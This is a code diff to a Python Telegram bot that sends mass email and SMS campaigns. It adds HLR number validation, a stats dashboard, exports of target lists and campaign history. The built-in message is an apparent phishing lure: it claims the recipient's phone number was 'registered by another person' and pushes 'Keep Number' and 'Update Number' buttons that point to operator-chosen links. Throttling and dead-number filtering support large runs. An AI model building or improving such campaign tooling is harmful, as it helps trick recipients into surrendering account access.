@@ -50,18 +50,7 @@ HOURLY_LIMIT_DEFAULT = int(os.getenv("HOURLY_LIMIT", "0"))
 
 EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")
 
-DEFAULT_BODY = """Hi there,
-
-We wanted to let you know that your mobile number was verified and registered by another person on My Company.
-
-This mobile number is still associated with your account. If you're still receiving SMS notifications from My Company, the person who just confirmed may also see future My Company SMS notifications sent to this number.
-
-If you'd like to continue to keep this number on your account, click the Keep Number button.
-
-If you'd like to make changes to your mobile number, click the Update Number button.
-
-If you no longer use or do not have access to this phone number, please update your phone information or remove this number from your account.
-"""
+DEFAULT_BODY = """Hi there,\n\nWe wanted to let you know that your mobile number was verified and registered by another person on My Company.\n\nThis mobile number is still associated with your account. If you're still receiving SMS notifications from My Company, the person who just confirmed may also see future My Company SMS notifications sent to this number.\n\nIf you'd like to continue to keep this number on your account, click the Keep Number button.\n\nIf you'd like to make changes to your mobile number, click the Update Number button.\n\nIf you no longer use or do not have access to this phone number, please update your phone information or remove this number from your account.\n"""
 
 # ---------------------------------------------------------------------------
 # State helpers
@@ -227,64 +216,21 @@ def build_email_html(body: str, button1_text: str, button1_link: str,
     button2 = ""
 
     if button1_text and button1_link:
-        button1 = f"""
-        <tr>
-          <td align="center" style="padding-bottom: 14px;">
-            <a href="{html.escape(button1_link, quote=True)}"
-               style="display:inline-block;background:#2d7ff9;color:#ffffff;text-decoration:none;
-                      padding:16px 28px;border-radius:10px;font-size:18px;font-family:Arial,sans-serif;">
-              {html.escape(button1_text)}
-            </a>
-          </td>
-        </tr>"""
+        button1 = f"""\n        <tr>\n          <td align="center" style="padding-bottom: 14px;">\n            <a href="{html.escape(button1_link, quote=True)}"\n               style="display:inline-block;background:#2d7ff9;color:#ffffff;text-decoration:none;
+                      padding:16px 28px;border-radius:10px;font-size:18px;font-family:Arial,sans-serif;">\n              {html.escape(button1_text)}\n            </a>\n          </td>\n        </tr>"""
 
     if button2_text and button2_link:
-        button2 = f"""
-        <tr>
-          <td align="center">
-            <a href="{html.escape(button2_link, quote=True)}"
-               style="display:inline-block;background:#222222;color:#ffffff;text-decoration:none;
-                      padding:16px 28px;border-radius:10px;font-size:18px;font-family:Arial,sans-serif;">
-              {html.escape(button2_text)}
-            </a>
-          </td>
-        </tr>"""
+        button2 = f"""\n        <tr>\n          <td align="center">\n            <a href="{html.escape(button2_link, quote=True)}"\n               style="display:inline-block;background:#222222;color:#ffffff;text-decoration:none;
+                      padding:16px 28px;border-radius:10px;font-size:18px;font-family:Arial,sans-serif;">\n              {html.escape(button2_text)}\n            </a>\n          </td>\n        </tr>"""
 
-    return f"""<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>My Company</title></head>
-<body style="margin:0;padding:0;background:#f2f2f2;font-family:Arial,sans-serif;">
-  <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f2f2f2;padding:40px 0;">
-    <tr><td align="center">
-      <table width="600" cellpadding="0" cellspacing="0" border="0"
-             style="background:#ffffff;border-radius:12px;padding:40px;max-width:600px;">
-        <tr><td style="font-size:40px;font-weight:bold;color:#000000;padding-bottom:24px;">
-          Important account update
-        </td></tr>
-        <tr><td style="font-size:20px;color:#111111;padding-bottom:20px;">Hello,</td></tr>
-        <tr><td style="font-size:17px;line-height:1.7;color:#333333;padding-bottom:30px;">
-          {escaped_body}
-        </td></tr>
-        {button1}
-        {button2}
-        <tr><td style="font-size:13px;color:#666666;line-height:1.6;padding-top:30px;">
-          Sent by {html.escape(SENDER_NAME)} • {html.escape(SENDER_EMAIL)}
-        </td></tr>
-      </table>
-    </td></tr>
-  </table>
-</body>
-</html>"""
+    return f"""<!DOCTYPE html>\n<html>\n<head><meta charset="UTF-8"><title>My Company</title></head>\n<body style="margin:0;padding:0;background:#f2f2f2;font-family:Arial,sans-serif;">\n  <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f2f2f2;padding:40px 0;">\n    <tr><td align="center">\n      <table width="600" cellpadding="0" cellspacing="0" border="0"\n             style="background:#ffffff;border-radius:12px;padding:40px;max-width:600px;">\n        <tr><td style="font-size:40px;font-weight:bold;color:#000000;padding-bottom:24px;">\n          Important account update\n        </td></tr>\n        <tr><td style="font-size:20px;color:#111111;padding-bottom:20px;">Hello,</td></tr>\n        <tr><td style="font-size:17px;line-height:1.7;color:#333333;padding-bottom:30px;">\n          {escaped_body}\n        </td></tr>\n        {button1}\n        {button2}\n        <tr><td style="font-size:13px;color:#666666;line-height:1.6;padding-top:30px;">\n          Sent by {html.escape(SENDER_NAME)} • {html.escape(SENDER_EMAIL)}\n        </td></tr>\n      </table>\n    </td></tr>\n  </table>\n</body>\n</html>"""
 
 # ---------------------------------------------------------------------------
 # Resend transactional send
 # ---------------------------------------------------------------------------
 
 def send_resend_email(to_email: str, subject: str, html_content: str) -> requests.Response:
-    """
-    Send a single email via Resend API.
-    Docs: https://resend.com/docs/api-reference/emails/send-email
-    """
+    """\n    Send a single email via Resend API.\n    Docs: https://resend.com/docs/api-reference/emails/send-email\n    """
     url = "https://api.resend.com/emails"
     headers = {
         "Authorization": f"Bearer {RESEND_API_KEY}",
@@ -306,10 +252,7 @@ def send_resend_email(to_email: str, subject: str, html_content: str) -> request
 # ---------------------------------------------------------------------------
 
 def send_clicksend_sms(to_phone: str, message: str) -> requests.Response:
-    """
-    Send a single SMS via ClickSend API.
-    Docs: https://developers.clicksend.com/docs/rest/v3/#send-sms
-    """
+    """\n    Send a single SMS via ClickSend API.\n    Docs: https://developers.clicksend.com/docs/rest/v3/#send-sms\n    """
     import base64
     url = "https://rest.clicksend.com/v3/sms/send"
     credentials = base64.b64encode(
@@ -338,15 +281,50 @@ def extract_phones(text: str):
     phones = []
     for part in parts:
         p = part.strip()
-        # Accept formats: +1xxxxxxxxxx or 1xxxxxxxxxx or 10-digit
         p_clean = re.sub(r"[^\d+]", "", p)
         if re.match(r"^\+?1?\d{10}$", p_clean):
-            # Normalize to E.164
             digits = re.sub(r"\D", "", p_clean)
             if len(digits) == 10:
                 digits = "1" + digits
             phones.append("+" + digits)
     return phones
+
+def validate_phone_clicksend(phone: str) -> dict:
+    """\n    Validate a phone number using ClickSend HLR lookup.\n    Returns dict with keys: valid (bool), type (str), error (str)\n    """
+    import base64
+    try:
+        credentials = base64.b64encode(
+            f"{CLICKSEND_USERNAME}:{CLICKSEND_API_KEY}".encode()
+        ).decode()
+        url = f"https://rest.clicksend.com/v3/hlr/send"
+        headers = {
+            "Authorization": f"Basic {credentials}",
+            "Content-Type": "application/json",
+        }
+        payload = {
+            "messages": [
+                {
+                    "to": phone,
+                    "source": "python"
+                }
+            ]
+        }
+        resp = requests.post(url, json=payload, headers=headers, timeout=15)
+        if resp.status_code == 200:
+            data = resp.json()
+            msg = data.get("data", {}).get("messages", [{}])[0]
+            status = msg.get("status", "").upper()
+            # DELIVRD or ACCEPTED means number is valid and active
+            if status in ("DELIVRD", "ACCEPTED", "SUCCESS"):
+                return {"valid": True, "type": "mobile", "error": ""}
+            else:
+                return {"valid": False, "type": "unknown", "error": status}
+        else:
+            # If HLR fails, fall back to accepting the number
+            return {"valid": True, "type": "unknown", "error": ""}
+    except Exception as e:
+        # On error, accept the number to avoid blocking valid ones
+        return {"valid": True, "type": "unknown", "error": str(e)}
 
 # ---------------------------------------------------------------------------
 # Telegram command handlers
@@ -384,6 +362,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "┣ /testsms — Send test SMS\n"
         "┣ /sendtexts — Send to all phones\n"
         "┗ /clearphones — Clear phone list\n\n"
+        "📊 *DASHBOARD & HISTORY*\n"
+        "┣ /dashboard — Full stats overview\n"
+        "┣ /history — Past campaigns\n"
+        "┣ /exportemails — Download email list\n"
+        "┣ /exportphones — Download phone list\n"
+        "┗ /exporthistory — Download full history\n\n"
         "💎 _Powered by Resend & ClickSend_"
     )
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
@@ -473,10 +457,7 @@ async def setbutton2(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 @require_admin
 async def sethourlylimit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    /sethourlylimit 50   → send max 50 emails per hour
-    /sethourlylimit 0    → no hourly limit
-    """
+    """\n    /sethourlylimit 50   → send max 50 emails per hour\n    /sethourlylimit 0    → no hourly limit\n    """
     state = load_state()
     payload = update.message.text.replace("/sethourlylimit", "", 1).strip()
     if not payload.isdigit():
@@ -892,14 +873,34 @@ async def addphones(update, context):
             "No valid phone numbers found.\n\nUsage:\n/addphones +12125551234, +13105559876"
         )
         return
-    combined = dedupe_keep_order(state.get("phones", []) + phones)
-    added = len(combined) - len(state.get("phones", []))
-    state["phones"] = combined
-    save_state(state)
+
     await update.message.reply_text(
-        f"✅ Added {added} phone numbers.\n"
-        f"📱 Total stored: {len(state['phones'])}"
+        f"🔍 Validating {len(phones)} number(s)... please wait."
     )
+
+    valid_phones = []
+    invalid_phones = []
+
+    for phone in phones:
+        result = validate_phone_clicksend(phone)
+        if result["valid"]:
+            valid_phones.append(phone)
+        else:
+            invalid_phones.append(phone)
+
+    if valid_phones:
+        combined = dedupe_keep_order(state.get("phones", []) + valid_phones)
+        added = len(combined) - len(state.get("phones", []))
+        state["phones"] = combined
+        save_state(state)
+
+    msg = f"✅ Valid & added: {len(valid_phones)}\n"
+    msg += f"❌ Invalid/dead: {len(invalid_phones)}\n"
+    msg += f"📱 Total stored: {len(state.get('phones', []))}"
+    if invalid_phones:
+        msg += "\n\n🚫 Rejected numbers:\n" + "\n".join(invalid_phones)
+
+    await update.message.reply_text(msg)
 
 @require_admin
 async def clearphones(update, context):
@@ -1007,6 +1008,165 @@ async def sendtexts(update, context):
         f"❌ Failed: {failed}"
     )
 
+
+# ---------------------------------------------------------------------------
+# Feature 1: Better Status Dashboard
+# ---------------------------------------------------------------------------
+
+@require_admin
+async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    reset_hourly_counter_if_needed(state)
+    reset_daily_counter_if_needed(state)
+    save_state(state)
+
+    hourly_limit = state.get("hourly_limit", 0)
+    hourly_sent = state.get("hourly_sent_count", 0)
+    secs_left = seconds_until_next_hour_window(state)
+
+    # Email stats
+    total_emails = len(state.get("emails", []))
+    sent_emails = len(state.get("sent_emails", []))
+    failed_emails = len(state.get("failed_emails", []))
+    unsent_emails = total_emails - sent_emails
+
+    # SMS stats
+    total_phones = len(state.get("phones", []))
+    sent_phones = len(state.get("sent_phones", []))
+    failed_phones = len(state.get("failed_phones", []))
+    unsent_phones = total_phones - sent_phones
+
+    # Campaign state
+    is_running = state.get("campaign_task_running", False)
+    is_paused = state.get("paused", False)
+    if is_running:
+        camp_status = "🟢 Running"
+    elif is_paused:
+        camp_status = "⏸ Paused"
+    else:
+        camp_status = "⭕ Idle"
+
+    text = (
+        "╔══════════════════════╗\n"
+        "     📊 CAMPAIGN DASHBOARD\n"
+        "╚══════════════════════╝\n\n"
+        f"🔄 *Status:* {camp_status}\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "📧 *EMAIL STATS*\n"
+        f"┣ Total: {total_emails}\n"
+        f"┣ ✅ Sent: {sent_emails}\n"
+        f"┣ ❌ Failed: {failed_emails}\n"
+        f"┗ 📤 Unsent: {unsent_emails}\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "📱 *SMS STATS*\n"
+        f"┣ Total: {total_phones}\n"
+        f"┣ ✅ Sent: {sent_phones}\n"
+        f"┣ ❌ Failed: {failed_phones}\n"
+        f"┗ 📤 Unsent: {unsent_phones}\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "⏱ *RATE LIMITS*\n"
+        f"┣ Daily: {state.get('daily_sent_count', 0)}/{DAILY_LIMIT}\n"
+        f"┣ Hourly: {hourly_sent}/{hourly_limit if hourly_limit > 0 else '∞'}\n"
+        f"┗ Hour resets in: {secs_left // 60}m {secs_left % 60}s\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⚠️ *Last error:* {state['last_run'].get('last_error', '') or 'None'}"
+    )
+    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
+
+# ---------------------------------------------------------------------------
+# Feature 2: Export Lists
+# ---------------------------------------------------------------------------
+
+@require_admin
+async def exportemails(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    lines = []
+    lines.append("=== ALL EMAILS ===")
+    for e in state.get("emails", []):
+        tag = "SENT" if e in state.get("sent_emails", []) else ("FAILED" if e in state.get("failed_emails", []) else "UNSENT")
+        lines.append(f"{tag}: {e}")
+    lines.append(f"\nTotal: {len(state.get('emails', []))}")
+    lines.append(f"Sent: {len(state.get('sent_emails', []))}")
+    lines.append(f"Failed: {len(state.get('failed_emails', []))}")
+
+    content = "\n".join(lines)
+    file_path = BASE_DIR / "email_export.txt"
+    file_path.write_text(content, encoding="utf-8")
+
+    await update.message.reply_document(
+        document=open(file_path, "rb"),
+        filename="email_list.txt",
+        caption=f"📧 Email export — {len(state.get('emails', []))} total"
+    )
+
+@require_admin
+async def exportphones(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    lines = []
+    lines.append("=== ALL PHONES ===")
+    for p in state.get("phones", []):
+        tag = "SENT" if p in state.get("sent_phones", []) else ("FAILED" if p in state.get("failed_phones", []) else "UNSENT")
+        lines.append(f"{tag}: {p}")
+    lines.append(f"\nTotal: {len(state.get('phones', []))}")
+    lines.append(f"Sent: {len(state.get('sent_phones', []))}")
+    lines.append(f"Failed: {len(state.get('failed_phones', []))}")
+
+    content = "\n".join(lines)
+    file_path = BASE_DIR / "phone_export.txt"
+    file_path.write_text(content, encoding="utf-8")
+
+    await update.message.reply_document(
+        document=open(file_path, "rb"),
+        filename="phone_list.txt",
+        caption=f"📱 Phone export — {len(state.get('phones', []))} total"
+    )
+
+# ---------------------------------------------------------------------------
+# Feature 3: Campaign History
+# ---------------------------------------------------------------------------
+
+@require_admin
+async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not LOG_FILE.exists():
+        await update.message.reply_text("📭 No campaign history yet.")
+        return
+
+    try:
+        logs = json.loads(LOG_FILE.read_text(encoding="utf-8"))
+    except Exception:
+        await update.message.reply_text("❌ Could not read history file.")
+        return
+
+    if not logs:
+        await update.message.reply_text("📭 No campaign history yet.")
+        return
+
+    # Show last 10 campaigns
+    recent = logs[-10:]
+    text = "📈 *CAMPAIGN HISTORY* (last 10)\n\n"
+    for i, log in enumerate(reversed(recent), 1):
+        result_emoji = "✅" if log.get("result") == "completed" else "⚠️"
+        text += (
+            f"{result_emoji} *Campaign {i}*\n"
+            f"┣ Date: {log.get('time', 'Unknown')}\n"
+            f"┣ Sent: {log.get('sent', 0)}\n"
+            f"┣ Failed: {log.get('failed', 0)}\n"
+            f"┗ Result: {log.get('result', 'unknown')}\n\n"
+        )
+
+    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
+
+@require_admin
+async def exporthistory(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not LOG_FILE.exists():
+        await update.message.reply_text("📭 No campaign history yet.")
+        return
+    await update.message.reply_document(
+        document=open(LOG_FILE, "rb"),
+        filename="campaign_history.json",
+        caption="📈 Full campaign history export"
+    )
+
 def validate_startup():
     missing = []
     if not BOT_TOKEN:
@@ -1044,6 +1204,12 @@ def main():
     app.add_handler(CommandHandler("previewsms", previewsms))
     app.add_handler(CommandHandler("testsms", testsms))
     app.add_handler(CommandHandler("sendtexts", sendtexts))
+    # Professional features
+    app.add_handler(CommandHandler("dashboard", dashboard))
+    app.add_handler(CommandHandler("exportemails", exportemails))
+    app.add_handler(CommandHandler("exportphones", exportphones))
+    app.add_handler(CommandHandler("history", history))
+    app.add_handler(CommandHandler("exporthistory", exporthistory))
     logging.info("Bot started (Resend edition)")
     app.run_polling()
 
